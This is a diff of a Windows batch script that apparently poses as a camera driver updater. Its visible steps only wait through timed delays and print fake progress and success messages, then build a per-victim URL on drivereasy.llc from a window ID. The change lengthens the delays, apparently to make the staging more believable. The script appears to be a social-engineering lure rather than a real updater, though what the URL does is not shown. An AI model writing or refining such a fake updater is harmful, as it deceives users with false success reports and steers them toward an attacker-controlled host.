@@ -9,9 +9,9 @@ if "!WINDOW_UID!"=="__ID__" goto :err_uid
 
 call :delay 4
 echo [INFO] Searching for Camera Drivers ...
-call :delay 4
-echo [INFO] Update Driver Packages...
 call :delay 6
+echo [INFO] Update Driver Packages...
+call :delay 12
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
   set "AUTO_URL=https://drivereasy.llc/auto-update/!WINDOW_UID!"
